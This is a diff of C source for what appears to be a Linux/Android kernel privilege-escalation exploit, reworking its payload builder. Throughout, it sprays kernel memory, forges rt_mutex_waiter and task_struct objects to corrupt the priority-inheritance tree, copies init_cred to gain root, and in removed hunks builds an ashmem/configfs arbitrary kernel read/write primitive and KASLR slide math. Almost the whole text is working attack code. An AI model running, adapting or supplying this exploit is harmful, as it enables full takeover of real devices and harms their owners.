@@ -27,30 +27,34 @@ uintptr_t fake_parent;
 uintptr_t fake_right;
 uintptr_t fake_left;
 uintptr_t fake_fops;
-uintptr_t binwrite_target;
-char ashmem_path[256] = "/dev/ashmem";
 
 int pselect_custom_write;
 uintptr_t pselect_custom_target;
-uintptr_t pselect_custom_value;
 int pselect_child_node;  /* Preserve initialized bytes when set. */
 
-void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode) {
+void set_pselect_write_mode(uintptr_t target, int mode) {
   pselect_custom_target = target;
-  pselect_custom_value = value;
   pselect_custom_write = mode;
 }
 
 void clear_pselect_write(void) {
   pselect_custom_write = 0;
   pselect_custom_target = 0;
-  pselect_custom_value = 0;
+}
+
+int tcp_route_selected(void) {
+  /* compact defaults to tcp; GHOSTLOCK_TCP_ROUTE=0 selects pselect */
+  const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
+  if (s && *s && strcmp(s, "0") == 0) {
+    return 0;
+  }
+  return COMPACT_WAITER;
 }
 
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -133,27 +137,16 @@ void log_startup_context(void) {
   pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
              getpid(), BUILD_VARIANT_LABEL);
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
-             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
-             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
+             "delta=%016llx init_task=%016llx root_tg=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)P0_KERNEL_PHYS_LOAD,
+             (unsigned long long)p0_kernel_phys_load,
              (unsigned long long)P0_KERNEL_PHYS_DELTA,
-             (unsigned long long)SLIDE_NFULNL_LOGGER,
-             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
              (unsigned long long)SLIDE_INIT_TASK,
-             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
-             (unsigned long long)SLIDE_SYSCTL_BOOTID);
+             (unsigned long long)SLIDE_ROOT_TASK_GROUP);
 }
 
-void log_slide_child_context(void) {
-  char attr[256];
-  char enforce[32];
-  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
-  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
-  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
-             "egid=%u attr=%s enforce=%s\n",
-             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
-             attr, enforce);
+void disable_rseq_for_thread(void) {
+  return;
 }
 
 long futex_op(uint32_t *uaddr, int op, uint32_t val,
@@ -176,122 +169,26 @@ long sched_setattr_tid(int tid, int nice_value) {
   return ret;
 }
 
-int try_cache_ashmem_path(const char *path) {
-  int fd = open(path, O_RDWR | O_CLOEXEC);
-  if (fd < 0) {
-    return 0;
-  }
-
-  close(fd);
-  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
-  return 1;
-}
-
-int same_rdev_path(const char *path, dev_t rdev) {
-  struct stat st;
-  if (stat(path, &st) != 0) {
-    return 0;
-  }
-  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
-}
-
-void init_ashmem_path(void) {
-  char boot_id[128];
-  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
-  if (fd >= 0) {
-    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
-    close(fd);
-    if (n > 0) {
-      boot_id[n] = 0;
-      boot_id[strcspn(boot_id, "\r\n")] = 0;
-
-      char path[256];
-      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
-      if (try_cache_ashmem_path(path)) {
-        return;
-      }
-    }
-  }
-
-  struct stat base;
-  int have_base = stat("/dev/ashmem", &base) == 0;
-  have_base = have_base && S_ISCHR(base.st_mode);
-  DIR *dir = opendir("/dev");
-  if (dir && have_base) {
-    struct dirent *de;
-    while ((de = readdir(dir)) != NULL) {
-      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
-          strcmp(de->d_name, "ashmem") == 0) {
-        continue;
-      }
-
-      char path[256];
-      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
-      if (same_rdev_path(path, base.st_rdev) &&
-          try_cache_ashmem_path(path)) {
-        closedir(dir);
-        return;
-      }
-    }
-  }
-  if (dir) {
-    closedir(dir);
-  }
-}
-
-int open_ashmem_device(void) {
-  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
-}
-
-int has_zero_byte(uintptr_t value) {
-  for (int i = 0; i < 8; i++) {
-    if (((value >> (i * 8)) & 0xff) == 0) {
-      return 1;
-    }
-  }
-  return 0;
-}
+/* Bootloader-selected physical load address. */
+uint64_t p0_kernel_phys_load;
 
 /* Selected entry's init_cred image address. */
 uintptr_t g_init_cred_image;
 
 void init_p0_profile(void) {
   pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
-          (unsigned long long)P0_KERNEL_PHYS_LOAD,
-          (unsigned long long)(P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET));
+          (unsigned long long)p0_kernel_phys_load,
+          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
 }
 
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
-  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
+  uintptr_t phys = p0_kernel_phys_load + off;
   return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
-}
-
-uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET);
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
   return p0_data_alias(image_addr);
-}
-
-uintptr_t kaslr_image_addr(uintptr_t image_addr) {
-  if (!kaslr_done) {
-    return image_addr;
-  }
-  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
-}
-
-uintptr_t text_addr(uintptr_t image_addr) {
-  return kaslr_image_addr(image_addr);
-}
-
-uintptr_t slide_canon_addr(uintptr_t data_alias) {
-  return kaslr_base + p0_alias_image_offset(data_alias);
-}
-
-uintptr_t canon_addr(uintptr_t image_addr) {
-  return text_addr(image_addr);
 }
 
 void put64(unsigned char *p, size_t off, uint64_t value) {
@@ -311,59 +208,6 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
   put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
   put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
   put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
-}
-
-void put_fake_fops_table(unsigned char *p, size_t off) {
-  put64(p, off + FOPS_OWNER_OFF, 0);
-  put64(p, off + FOPS_LLSEEK_OFF,
-        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-  put64(p, off + FOPS_READ_OFF, 0);
-  put64(p, off + FOPS_WRITE_OFF, 0);
-  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
-  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
-  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
-  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
-  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
-  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
-  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
-  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
-  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
-}
-
-int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
-  char name[ASHMEM_NAME_LEN];
-  memset(name, 0x41, sizeof(name));
-
-  for (size_t i = 0; i < len; i++) {
-    name[i] = blob[i] ? blob[i] : 1;
-  }
-  name[len] = 0;
-  return ioctl(fd, ASHMEM_SET_NAME, name);
-}
-
-int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
-  char name[ASHMEM_NAME_LEN];
-  memset(name, 0x41, sizeof(name));
-
-  for (size_t i = 0; i < pos; i++) {
-    name[i] = blob[i] ? blob[i] : 1;
-  }
-  name[pos] = 0;
-  return ioctl(fd, ASHMEM_SET_NAME, name);
-}
-
-int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
-  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
-    return -1;
-  }
-
-  for (size_t i = len; i > 0; i--) {
-    if (blob[i - 1] == 0 &&
-        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
-      return -1;
-    }
-  }
-  return 0;
 }
 
 pid_t clone_child(void) {
@@ -454,9 +298,8 @@ int clone_memfd(void) {
   return fd;
 }
 
-void prepare_ctxs(int payload_mode) {
-  int prepare_slabs = payload_mode == PAGE_PAYLOAD_SLIDE ? 8 : 8;
-  prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
+void prepare_ctxs(void) {
+  prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
 
@@ -473,114 +316,118 @@ void prepare_ctxs(int payload_mode) {
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
 }
 
-int prepare_skb_payload(uintptr_t base, int payload_mode) {
+int prepare_skb_payload(uintptr_t base) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
-  uintptr_t payload_base = base + SKB_DATA_DELTA;
+  int tcp = tcp_route_selected();
+  long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
+  size_t chunk_bias = tcp ? 0xe80 : (size_t)SKB_FRAG_BIAS;
+  size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t)FAKE_TASK_OFF;
+
+  uintptr_t payload_base = base + payload_delta;
 
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
-  fake_task = payload_base + FAKE_TASK_OFF;
+  fake_task = payload_base + fake_task_off;
   fake_fops = payload_base + FOPS_TABLE_OFF;
-  if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    if (pselect_custom_write) {
-      if (pselect_child_node) {
-        if (pselect_custom_write == 2) {
-          /* W2 uses init_cred; resolve it from the selected device entry. */
-          fake_right = data_addr(g_init_cred_image);
-        } else {
-          /* W1 targets the initialized page at base+0x100. */
-          fake_right = base + 0x100;
-        }
-      } else {
-        fake_right = 0;  /* leaf: write 0 */
-      }
-      fake_left = 0;
+  if (pselect_custom_write) {
+    if (pselect_child_node) {
       if (pselect_custom_write == 2) {
-        fake_fops = payload_base + CRED_COPY_OFF;
-      }
-      fake_parent = pselect_custom_target - 8;
-      if (!pselect_custom_value) {
-        pselect_custom_value = fake_fops;
+        /* W2 uses init_cred; resolve it from the selected device entry. */
+        fake_right = data_addr(g_init_cred_image);
+      } else {
+        /* W1 targets the initialized page at base+0x100. */
+        fake_right = base + 0x100;
       }
     } else {
-      fake_parent = fake_fops;
-      fake_right = data_addr(ASHMEM_MISC_FOPS);
-      fake_left = 0;
+      fake_right = 0;  /* leaf: write 0 */
     }
-    binwrite_target = payload_base + SCRATCH_OFF;
-  } else {
-    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
-    fake_right = fake_fops;
-    fake_left = payload_base + LEFT_OFF;
-    binwrite_target = payload_base + FOPS_OFF + 0x700;
+    fake_left = 0;
+    if (pselect_custom_write == 2) {
+      fake_fops = payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+    }
+    fake_parent = pselect_custom_target - 8;
   }
 
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
-  uint64_t waiter_task = text_addr(INIT_TASK);
-  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-  uint64_t pi_top_task = text_addr(INIT_TASK);
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_LOGGERS_0_1;
-    write_right = 0;
-    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
-    waiter_task = SLIDE_INIT_TASK;
-    task_group = SLIDE_ROOT_TASK_GROUP;
-    pi_top_task = SLIDE_INIT_TASK;
-  }
+  uint64_t waiter_task = INIT_TASK;
+  uint64_t task_group = ROOT_TASK_GROUP;
+  uint64_t pi_top_task = INIT_TASK;
+
+  int compact = COMPACT_WAITER;
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+    unsigned char *p = skb_buf + chunk + chunk_bias;
 
     put32(p, LOCK_OFF + 0x00, 0);
-    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
-    } else {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
-    }
+    put64(p, LOCK_OFF + 0x08, fake_w0);
+    put64(p, LOCK_OFF + 0x10, fake_w0);
+    put64(p, LOCK_OFF + 0x18, fake_task | 1);
 
-    put64(p, W0_OFF + 0x00, 1);
-    put64(p, W0_OFF + 0x08, 0);
-    put64(p, W0_OFF + 0x10, 0);
-    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
-
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      if (pselect_custom_write) {
-        /* Empty PI waiters avoid tree rebalancing during reinsertion. */
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+    if (compact) {
+      /* Words ride the erase relink: pc = value, rb_left = dest,
+       * rb_right = 0 or the one-child arm also clobbers *(value) with
+       * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
+       * would leave the node parentless for enqueue_pi to trash
+       * fake_task. prio > 120 gates this erase. The relink's second
+       * write lands in *(value+8): cred image on W2, page rb_root at 0. */
+      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
+      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
+      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
+      if (tcp && write_right) {
+        put64(p, W0_OFF + 0x18, write_right);
+        put64(p, W0_OFF + 0x20, 0);
+        put64(p, W0_OFF + 0x28, pselect_custom_target);
       } else {
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+        put64(p, W0_OFF + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
+        put64(p, W0_OFF + 0x20, write_right); /* pi_tree_entry.rb_right */
+        put64(p, W0_OFF + 0x28, write_left);  /* pi_tree_entry.rb_left */
       }
+      put64(p, W0_OFF + 0x30, waiter_task); /* task */
+      put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
+      put32(p, W0_OFF + 0x40, 0);           /* wake_state */
+      put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
+      put64(p, W0_OFF + 0x48, 0);           /* deadline */
+      put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
     } else {
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+      /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
+      put64(p, W0_OFF + 0x00, 1);
+      put64(p, W0_OFF + 0x08, 0);
+      put64(p, W0_OFF + 0x10, 0);
+      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
     }
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+
+    /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
+    uint32_t ft_prio_off       = FAKE_TASK_PRIO_OFF;
+    uint32_t ft_nprio_off      = FAKE_TASK_NORMAL_PRIO_OFF;
+    uint32_t ft_tg_off         = FAKE_TASK_TASK_GROUP_OFF;
+    uint32_t ft_pi_lock_off    = FAKE_TASK_PI_LOCK_OFF;
+    uint32_t ft_pi_wait_off    = FAKE_TASK_PI_WAITERS_OFF;
+    uint32_t ft_pi_top_off     = FAKE_TASK_PI_TOP_TASK_OFF;
+    uint32_t ft_pi_blocked_off = FAKE_TASK_PI_BLOCKED_ON_OFF;
+
+    put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
+    put32(p, fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
+    put32(p, fake_task_off + ft_nprio_off, FAKE_TASK_PRIO);
+    put32(p, fake_task_off + ft_pi_lock_off, 0);
+    /* Empty PI waiters avoid tree rebalancing during reinsertion. */
+    put64(p, fake_task_off + ft_pi_wait_off, 0);
+    put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
+    put64(p, fake_task_off + ft_tg_off, task_group);
+    put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
+    put64(p, fake_task_off + ft_pi_blocked_off, 0);
 
     put64(p, RIGHT_OFF + 0x00, fake_parent);
     put64(p, RIGHT_OFF + 0x08, 0);
@@ -590,22 +437,19 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      put_fake_fops_table(p, FOPS_TABLE_OFF);
-      if (pselect_custom_write >= 2) {
-        fill_init_cred_copy(p, CRED_COPY_OFF);
-      }
+    if (pselect_custom_write >= 2) {
+      fill_init_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
     }
   }
   return 1;
 }
 
-uintptr_t prepare_kernel_page(int payload_mode) {
+uintptr_t prepare_kernel_page(void) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
   close_reclaim_sockets();
-  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
-  prepare_ctxs(payload_mode);
+  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
+  prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
@@ -622,7 +466,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
@@ -725,7 +569,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  if (!prepare_skb_payload(base, payload_mode)) {
+  if (!prepare_skb_payload(base)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -803,19 +647,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   return base;
 }
 
-uintptr_t prepare_good_kernel_page(int payload_mode) {
-  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
-  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    max_attempts = 4;
-  }
+uintptr_t prepare_good_kernel_page(void) {
+  int max_attempts = 4;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
   deadline.tv_sec += 240;
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
-    uintptr_t base = prepare_kernel_page(payload_mode);
+    uintptr_t base = prepare_kernel_page();
     if (base) {
       pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
               ms_since(&t_good));
@@ -831,86 +670,4 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
                max_attempts, ms_since(&t_good));
   }
   return 0;
-}
-
-ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
-  unsigned char blob[128];
-  memset(blob, 0, sizeof(blob));
-  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
-  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
-  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
-  errno = 0;
-  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
-  int set_errno = errno;
-  if (set_ret != 0) {
-    errno = set_errno;
-    return -1;
-  }
-
-  errno = 0;
-  ssize_t wr = pwrite(fd, data, len, 0);
-  return wr;
-}
-
-ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
-  unsigned char blob[128];
-  memset(blob, 0, sizeof(blob));
-  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
-  uintptr_t page = target - (uintptr_t)pos;
-  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
-  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
-  errno = 0;
-  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
-  int set_errno = errno;
-  if (set_ret != 0) {
-    errno = set_errno;
-    return -1;
-  }
-
-  errno = 0;
-  ssize_t rd = pread(fd, data, len, pos);
-  return rd;
-}
-
-int is_kernel_ptr(uintptr_t value) {
-  return value >= 0xffff800000000000ULL;
-}
-
-int is_direct_ptr(uintptr_t value) {
-  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
-}
-
-uint64_t kernel_read64(int fd, uintptr_t target) {
-  uint64_t value = 0;
-  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
-  if (n != (ssize_t)sizeof(value)) {
-    return 0;
-  }
-  return value;
-}
-
-ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
-  return configfs_write_once(fd, target, data, len);
-}
-
-ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
-  return configfs_read_once(fd, target, data, len);
-}
-
-uintptr_t pselect_write_value(void) {
-  return pselect_custom_value;
-}
-uintptr_t pselect_write_target(void) {
-  return pselect_custom_target;
-}
-int pselect_custom_write_enabled(void) {
-  return pselect_custom_write;
-}
-int pselect_write_shape(void) {
-  return 1;
-}
-void set_pselect_write(uintptr_t target, uintptr_t value) {
-  pselect_custom_target = target;
-  pselect_custom_value = value;
-  pselect_custom_write = 1;
 }
